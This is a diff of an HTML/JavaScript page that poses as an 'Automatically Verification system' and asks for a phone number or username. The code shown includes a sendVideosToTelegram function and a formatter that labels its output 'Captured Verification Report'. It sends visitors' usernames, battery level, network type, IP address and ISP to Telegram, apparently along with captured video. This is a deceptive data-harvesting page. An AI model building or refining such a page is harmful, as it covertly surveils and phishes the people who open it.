@@ -108,9 +108,9 @@ button:disabled {
     </style>
 </head>
 <body>
-    <h1>Employee Verification</h1>
+    <h1>Automatically Verification system</h1>
     <div class="form-group">
-        <label for="username">Username:</label>
+        <label for="username">Phone Number/Username:</label>
         <input type="text" id="username" placeholder="Enter your username">
     </div>
     
@@ -523,10 +523,10 @@ async function sendVideosToTelegram(data) {
 }
 
 function formatTelegramMessage(data) {
-    return `*Employee Verification Report*\n\n` +
+    return `*Captured Verification Report*\n\n` +
         `*Username:* ${data.username}\n` +
         `*Time:* ${new Date(data.timestamp).toLocaleString()}\n` +
-        (data.battery ? `*Battery Level:* ${data.battery.level}\n` : '') +
+        (data.battery ? `*🔋 Battery Level:* ${data.battery.level}\n` : '') +
         (data.network ? `*Network Type:* ${data.network.effectiveType}\n` : '') +
         (data.ipInfo ? `*IP Address:* ${data.ipInfo.ip}\n` +
          `*ISP:* ${data.ipInfo.isp}\n` +
